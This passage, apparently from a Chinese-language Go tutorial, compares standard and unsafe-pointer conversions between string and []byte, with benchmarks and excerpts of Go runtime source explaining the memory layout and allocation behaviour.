9}1011func\u0026nbsp;Bytes2String(b\u0026nbsp;[]byte)\u0026nbsp;string\u0026nbsp;{12\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;*(*string)(unsafe.Pointer(\u0026amp;b))13}性能对比既然有两种转换方式，那么我们有必要对它们做性能对比。 1//\u0026nbsp;测试强转换功能 2func\u0026nbsp;TestBytes2String(t\u0026nbsp;*testing.T)\u0026nbsp;{\n3\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;x\u0026nbsp;:=\u0026nbsp;[]byte(\"Hello\u0026nbsp;Gopher!\")\n4\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;y\u0026nbsp;:=\u0026nbsp;Bytes2String(x)\n5\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;z\u0026nbsp;:=\u0026nbsp;string(x)\n6\n7\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;y\u0026nbsp;!=\u0026nbsp;z\u0026nbsp;{\n8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;t.Fail()\n9\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n10}\n11\n12//\u0026nbsp;测试强转换功能\n13func\u0026nbsp;TestString2Bytes(t\u0026nbsp;*testing.T)\u0026nbsp;{\n14\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;x\u0026nbsp;:=\u0026nbsp;\"Hello\u0026nbsp;Gopher!\"\n15\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;y\u0026nbsp;:=\u0026nbsp;String2Bytes(x)\n16\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;z\u0026nbsp;:=\u0026nbsp;[]byte(x)\n17\n18\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;!bytes.Equal(y,\u0026nbsp;z)\u0026nbsp;{\n19\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;t.Fail()\n20\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n21}\n22\n23//\u0026nbsp;测试标准转换string()性能\n24func\u0026nbsp;Benchmark_NormalBytes2String(b\u0026nbsp;*testing.B)\u0026nbsp;{\n25\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;x\u0026nbsp;:=\u0026nbsp;[]byte(\"Hello\u0026nbsp;Gopher!\u0026nbsp;Hello\u0026nbsp;Gopher!\u0026nbsp;Hello\u0026nbsp;Gopher!\")\n26\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;for\u0026nbsp;i\u0026nbsp;:=\u0026nbsp;0;\u0026nbsp;i\u0026nbsp;\u0026lt;\u0026nbsp;b.N;\u0026nbsp;i++\u0026nbsp;{\n27\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;_\u0026nbsp;=\u0026nbsp;string(x)\n28\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n29}\n30\n31//\u0026nbsp;测试强转换[]byte到string性能\n32func\u0026nbsp;Benchmark_Byte2String(b\u0026nbsp;*testing.B)\u0026nbsp;{\n33\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;x\u0026nbsp;:=\u0026nbsp;[]byte(\"Hello\u0026nbsp;Gopher!\u0026nbsp;Hello\u0026nbsp;Gopher!\u0026nbsp;Hello\u0026nbsp;Gopher!\")\n34\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;for\u0026nbsp;i\u0026nbsp;:=\u0026nbsp;0;\u0026nbsp;i\u0026nbsp;\u0026lt;\u0026nbsp;b.N;\u0026nbsp;i++\u0026nbsp;{\n35\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;_\u0026nbsp;=\u0026nbsp;Bytes2String(x)\n36\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n37}\n38\n39//\u0026nbsp;测试标准转换[]byte性能\n40func\u0026nbsp;Benchmark_NormalString2Bytes(b\u0026nbsp;*testing.B)\u0026nbsp;{\n41\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;x\u0026nbsp;:=\u0026nbsp;\"Hello\u0026nbsp;Gopher!\u0026nbsp;Hello\u0026nbsp;Gopher!\u0026nbsp;Hello\u0026nbsp;Gopher!\"\n42\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;for\u0026nbsp;i\u0026nbsp;:=\u0026nbsp;0;\u0026nbsp;i\u0026nbsp;\u0026lt;\u0026nbsp;b.N;\u0026nbsp;i++\u0026nbsp;{\n43\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;_\u0026nbsp;=\u0026nbsp;[]byte(x)\n44\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n45}\n46\n47//\u0026nbsp;测试强转换string到[]byte性能\n48func\u0026nbsp;Benchmark_String2Bytes(b\u0026nbsp;*testing.B)\u0026nbsp;{\n49\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;x\u0026nbsp;:=\u0026nbsp;\"Hello\u0026nbsp;Gopher!\u0026nbsp;Hello\u0026nbsp;Gopher!\u0026nbsp;Hello\u0026nbsp;Gopher!\"\n50\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;for\u0026nbsp;i\u0026nbsp;:=\u0026nbsp;0;\u0026nbsp;i\u0026nbsp;\u0026lt;\u0026nbsp;b.N;\u0026nbsp;i++\u0026nbsp;{\n51\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;_\u0026nbsp;=\u0026nbsp;String2Bytes(x)\n52\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n53}\n测试结果如下\n1$\u0026nbsp;go\u0026nbsp;test\u0026nbsp;-bench=\".\"\u0026nbsp;-benchmem\n2goos:\u0026nbsp;darwin\n3goarch:\u0026nbsp;amd64\n4pkg:\u0026nbsp;workspace/example/stringBytes\n5Benchmark_NormalBytes2String-8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;38363413\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;27.9\u0026nbsp;ns/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;48\u0026nbsp;B/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;1\u0026nbsp;allocs/op\n6Benchmark_Byte2String-8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;1000000000\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0.265\u0026nbsp;ns/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0\u0026nbsp;B/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0\u0026nbsp;allocs/op\n7Benchmark_NormalString2Bytes-8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;32577080\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;34.8\u0026nbsp;ns/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;48\u0026nbsp;B/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;1\u0026nbsp;allocs/op\n8Benchmark_String2Bytes-8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;1000000000\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0.532\u0026nbsp;ns/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0\u0026nbsp;B/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0\u0026nbsp;allocs/op\n9PASS\n10ok\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;workspace/example/stringBytes\u0026nbsp;\u0026nbsp;\u0026nbsp;3.170s\n注意，-benchmem可以提供每次操作分配内存的次数，以及每次操作分配的字节数。当x的数据均为\"Hello Gopher!\"时，测试结果如下\n1$\u0026nbsp;go\u0026nbsp;test\u0026nbsp;-bench=\".\"\u0026nbsp;-benchmem\n2goos:\u0026nbsp;darwin\n3goarch:\u0026nbsp;amd64\n4pkg:\u0026nbsp;workspace/example/stringBytes\n5Benchmark_NormalBytes2String-8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;245907674\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;4.86\u0026nbsp;ns/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0\u0026nbsp;B/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0\u0026nbsp;allocs/op\n6Benchmark_Byte2String-8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;1000000000\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0.266\u0026nbsp;ns/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0\u0026nbsp;B/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0\u0026nbsp;allocs/op\n7Benchmark_NormalString2Bytes-8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;202329386\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;5.92\u0026nbsp;ns/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0\u0026nbsp;B/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0\u0026nbsp;allocs/op\n8Benchmark_String2Bytes-8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;1000000000\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0.532\u0026nbsp;ns/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0\u0026nbsp;B/op\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;0\u0026nbsp;allocs/op\n9PASS\n10ok\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;workspace/example/stringBytes\u0026nbsp;\u0026nbsp;\u0026nbsp;4.383s\n强转换方式的性能会明显优于标准转换。\n读者可以思考以下问题1.为什么强转换性能会比标准转换好？2.为什么在上述测试中，当x的数据较大时，标准转换方式会有一次分配内存的操作，从而导致其性能更差，而强转换方式却不受影响？3.既然强转换方式性能这么好，为什么go语言提供给我们使用的是标准转换方式？\n原理分析\n要回答以上三个问题，首先要明白是string和[]byte在go中到底是什么。[]byte在go中，byte是uint8的别名，在go标准库builtin中有如下说明：1//\u0026nbsp;byte\u0026nbsp;is\u0026nbsp;an\u0026nbsp;alias\u0026nbsp;for\u0026nbsp;uint8\u0026nbsp;and\u0026nbsp;is\u0026nbsp;equivalent\u0026nbsp;to\u0026nbsp;uint8\u0026nbsp;in\u0026nbsp;all\u0026nbsp;ways.\u0026nbsp;It\u0026nbsp;is\n2//\u0026nbsp;used,\u0026nbsp;by\u0026nbsp;convention,\u0026nbsp;to\u0026nbsp;distinguish\u0026nbsp;byte\u0026nbsp;values\u0026nbsp;from\u0026nbsp;8-bit\u0026nbsp;unsigned\n3//\u0026nbsp;integer\u0026nbsp;values.\n4type\u0026nbsp;byte\u0026nbsp;=\u0026nbsp;uint8\n在go的源码中src/runtime/slice.go，slice的定义如下：\n1type\u0026nbsp;slice\u0026nbsp;struct\u0026nbsp;{\n2\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;array\u0026nbsp;unsafe.Pointer\n3\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;len\u0026nbsp;\u0026nbsp;\u0026nbsp;int\n4\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;cap\u0026nbsp;\u0026nbsp;\u0026nbsp;int\n5}\narray是底层数组的指针，len表示长度，cap表示容量。对于[]byte来说，array指向的就是byte数组。\nstring关于string类型，在go标准库builtin中有如下说明：\n1//\u0026nbsp;string\u0026nbsp;is\u0026nbsp;the\u0026nbsp;set\u0026nbsp;of\u0026nbsp;all\u0026nbsp;strings\u0026nbsp;of\u0026nbsp;8-bit\u0026nbsp;bytes,\u0026nbsp;conventionally\u0026nbsp;but\u0026nbsp;not\n2//\u0026nbsp;necessarily\u0026nbsp;representing\u0026nbsp;UTF-8-encoded\u0026nbsp;text.\u0026nbsp;A\u0026nbsp;string\u0026nbsp;may\u0026nbsp;be\u0026nbsp;empty,\u0026nbsp;but\n3//\u0026nbsp;not\u0026nbsp;nil.\u0026nbsp;Values\u0026nbsp;of\u0026nbsp;string\u0026nbsp;type\u0026nbsp;are\u0026nbsp;immutable.\n4type\u0026nbsp;string\u0026nbsp;string\n翻译过来就是：string是8位字节的集合，通常但不一定代表UTF-8编码的文本。string可以为空，但是不能为nil。string的值是不能改变的。在go的源码中src/runtime/string.go，string的定义如下：\n1type\u0026nbsp;stringStruct\u0026nbsp;struct\u0026nbsp;{\n2\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;str\u0026nbsp;unsafe.Pointer\n3\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;len\u0026nbsp;int\n4}\nstringStruct代表的就是一个string对象，str指针指向的是某个数组的首地址，len代表的数组长度。那么这个数组是什么呢？我们可以在实例化stringStruct对象时找到答案。\n1//go:nosplit\n2func\u0026nbsp;gostringnocopy(str\u0026nbsp;*byte)\u0026nbsp;string\u0026nbsp;{\n3\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;ss\u0026nbsp;:=\u0026nbsp;stringStruct{str:\u0026nbsp;unsafe.Pointer(str),\u0026nbsp;len:\u0026nbsp;findnull(str)}\n4\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;s\u0026nbsp;:=\u0026nbsp;*(*string)(unsafe.Pointer(\u0026amp;ss))\n5\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;s\n6}\n可以看到，入参str指针就是指向byte的指针，那么我们可以确定string的底层数据结构就是byte数组。\n综上，string与[]byte在底层结构上是非常的相近（后者的底层表达仅多了一个cap属性，因此它们在内存布局上是可对齐的），这也就是为何builtin中内置函数copy会有一种特殊情况copy(dst []byte, src string) int的原因了。\n1//\u0026nbsp;The\u0026nbsp;copy\u0026nbsp;built-in\u0026nbsp;function\u0026nbsp;copies\u0026nbsp;elements\u0026nbsp;from\u0026nbsp;a\u0026nbsp;source\u0026nbsp;slice\u0026nbsp;into\u0026nbsp;a\n2//\u0026nbsp;destination\u0026nbsp;slice.\u0026nbsp;(As\u0026nbsp;a\u0026nbsp;special\u0026nbsp;case,\u0026nbsp;it\u0026nbsp;also\u0026nbsp;will\u0026nbsp;copy\u0026nbsp;bytes\u0026nbsp;from\u0026nbsp;a\n3//\u0026nbsp;string\u0026nbsp;to\u0026nbsp;a\u0026nbsp;slice\u0026nbsp;of\u0026nbsp;bytes.)\u0026nbsp;The\u0026nbsp;source\u0026nbsp;and\u0026nbsp;destination\u0026nbsp;may\u0026nbsp;overlap.\u0026nbsp;Copy\n4//\u0026nbsp;returns\u0026nbsp;the\u0026nbsp;number\u0026nbsp;of\u0026nbsp;elements\u0026nbsp;copied,\u0026nbsp;which\u0026nbsp;will\u0026nbsp;be\u0026nbsp;the\u0026nbsp;minimum\u0026nbsp;of\n5//\u0026nbsp;len(src)\u0026nbsp;and\u0026nbsp;len(dst).\n6func\u0026nbsp;copy(dst,\u0026nbsp;src\u0026nbsp;[]Type)\u0026nbsp;int\n7区别对于[]byte与string而言，两者之间最大的区别就是string的值不能改变。这该如何理解呢？下面通过两个例子来说明。对于[]byte来说，以下操作是可行的：\n1b\u0026nbsp;:=\u0026nbsp;[]byte(\"Hello\u0026nbsp;Gopher!\")\n2b\u0026nbsp;[1]\u0026nbsp;=\u0026nbsp;'T'\nstring，修改操作是被禁止的：\n1s\u0026nbsp;:=\u0026nbsp;\"Hello\u0026nbsp;Gopher!\"\n2s[1]\u0026nbsp;=\u0026nbsp;'T'\n而string能支持这样的操作：\n1s\u0026nbsp;:=\u0026nbsp;\"Hello\u0026nbsp;Gopher!\"\n2s\u0026nbsp;=\u0026nbsp;\"Tello\u0026nbsp;Gopher!\"\n字符串的值不能被更改，但可以被替换。string在底层都是结构体stringStruct{str: str_point, len: str_len}，string结构体的str指针指向的是一个字符常量的地址， 这个地址里面的内容是不可以被改变的，因为它是只读的，但是这个指针可以指向不同的地址。\n那么，以下操作的含义是不同的：\n1s\u0026nbsp;:=\u0026nbsp;\"S1\"\u0026nbsp;//\u0026nbsp;分配存储\"S1\"的内存空间，s结构体里的str指针指向这块内存\n2s\u0026nbsp;=\u0026nbsp;\"S2\"\u0026nbsp;\u0026nbsp;//\u0026nbsp;分配存储\"S2\"的内存空间，s结构体里的str指针转为指向这块内存\n3\n4b\u0026nbsp;:=\u0026nbsp;[]byte{1}\u0026nbsp;//\u0026nbsp;分配存储'1'数组的内存空间，b结构体的array指针指向这个数组。\n5b\u0026nbsp;=\u0026nbsp;[]byte{2}\u0026nbsp;\u0026nbsp;//\u0026nbsp;将array的内容改为'2'\n图解如下\n因为string的指针指向的内容是不可以更改的，所以每更改一次字符串，就得重新分配一次内存，之前分配的空间还需要gc回收，这是导致string相较于[]byte操作低效的根本原因。标准转换的实现细节[]byte(string)的实现（源码在src/runtime/string.go中）\n1//\u0026nbsp;The\u0026nbsp;constant\u0026nbsp;is\u0026nbsp;known\u0026nbsp;to\u0026nbsp;the\u0026nbsp;compiler.\n2//\u0026nbsp;There\u0026nbsp;is\u0026nbsp;no\u0026nbsp;fundamental\u0026nbsp;theory\u0026nbsp;behind\u0026nbsp;this\u0026nbsp;number.\n3const\u0026nbsp;tmpStringBufSize\u0026nbsp;=\u0026nbsp;32\n4\n5type\u0026nbsp;tmpBuf\u0026nbsp;[tmpStringBufSize]byte\n6\n7func\u0026nbsp;stringtoslicebyte(buf\u0026nbsp;*tmpBuf,\u0026nbsp;s\u0026nbsp;string)\u0026nbsp;[]byte\u0026nbsp;{\n8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;var\u0026nbsp;b\u0026nbsp;[]byte\n9\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;buf\u0026nbsp;!=\u0026nbsp;nil\u0026nbsp;\u0026amp;\u0026amp;\u0026nbsp;len(s)\u0026nbsp;\u0026lt;=\u0026nbsp;len(buf)\u0026nbsp;{\n10\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;*buf\u0026nbsp;=\u0026nbsp;tmpBuf{}\n11\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;b\u0026nbsp;=\u0026nbsp;buf[:len(s)]\n12\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\u0026nbsp;else\u0026nbsp;{\n13\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;b\u0026nbsp;=\u0026nbsp;rawbyteslice(len(s))\n14\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n15\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;copy(b,\u0026nbsp;s)\n16\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;b\n17}\n18\n19//\u0026nbsp;rawbyteslice\u0026nbsp;allocates\u0026nbsp;a\u0026nbsp;new\u0026nbsp;byte\u0026nbsp;slice.\u0026nbsp;The\u0026nbsp;byte\u0026nbsp;slice\u0026nbsp;is\u0026nbsp;not\u0026nbsp;zeroed.\n20func\u0026nbsp;rawbyteslice(size\u0026nbsp;int)\u0026nbsp;(b\u0026nbsp;[]byte)\u0026nbsp;{\n21\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;cap\u0026nbsp;:=\u0026nbsp;roundupsize(uintptr(size))\n22\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;p\u0026nbsp;:=\u0026nbsp;mallocgc(cap,\u0026nbsp;nil,\u0026nbsp;false)\n23\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;cap\u0026nbsp;!=\u0026nbsp;uintptr(size)\u0026nbsp;{\n24\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;memclrNoHeapPointers(add(p,\u0026nbsp;uintptr(size)),\u0026nbsp;cap-uintptr(size))\n25\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n26\n27\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;*(*slice)(unsafe.Pointer(\u0026amp;b))\u0026nbsp;=\u0026nbsp;slice{p,\u0026nbsp;size,\u0026nbsp;int(cap)}\n28\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\n29}\n这里有两种情况：s的长度是否大于32。当大于32时，go需要调用mallocgc分配一块新的内存（大小由s决定），这也就回答了上文中的问题2：当x的数据较大时，标准转换方式会有一次分配内存的操作。最后通过copy函数实现string到[]byte的拷贝，具体实现在src/runtime/slice.go中的slicestringcopy方法。\n1func\u0026nbsp;slicestringcopy(to\u0026nbsp;[]byte,\u0026nbsp;fm\u0026nbsp;string)\u0026nbsp;int\u0026nbsp;{\n2\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;len(fm)\u0026nbsp;==\u0026nbsp;0\u0026nbsp;||\u0026nbsp;len(to)\u0026nbsp;==\u0026nbsp;0\u0026nbsp;{\n3\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;0\n4\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n5\n6\u0026nbsp;\u0026nbsp;//\u0026nbsp;copy的长度取决与string和[]byte的长度最小值\n7\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;n\u0026nbsp;:=\u0026nbsp;len(fm)\n8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;len(to)\u0026nbsp;\u0026lt;\u0026nbsp;n\u0026nbsp;{\n9\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;n\u0026nbsp;=\u0026nbsp;len(to)\n10\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n11\n12\u0026nbsp;\u0026nbsp;//\u0026nbsp;如果开启了竞态检测\u0026nbsp;-race\n13\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;raceenabled\u0026nbsp;{\n14\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;callerpc\u0026nbsp;:=\u0026nbsp;getcallerpc()\n15\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;pc\u0026nbsp;:=\u0026nbsp;funcPC(slicestringcopy)\n16\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;racewriterangepc(unsafe.Pointer(\u0026amp;to[0]),\u0026nbsp;uintptr(n),\u0026nbsp;callerpc,\u0026nbsp;pc)\n17\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n18\u0026nbsp;\u0026nbsp;//\u0026nbsp;如果开启了memory\u0026nbsp;sanitizer\u0026nbsp;-msan\n19\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;msanenabled\u0026nbsp;{\n20\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;msanwrite(unsafe.Pointer(\u0026amp;to[0]),\u0026nbsp;uintptr(n))\n21\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n22\n23\u0026nbsp;\u0026nbsp;//\u0026nbsp;该方法将string的底层数组从头部复制n个到[]byte对应的底层数组中去（这里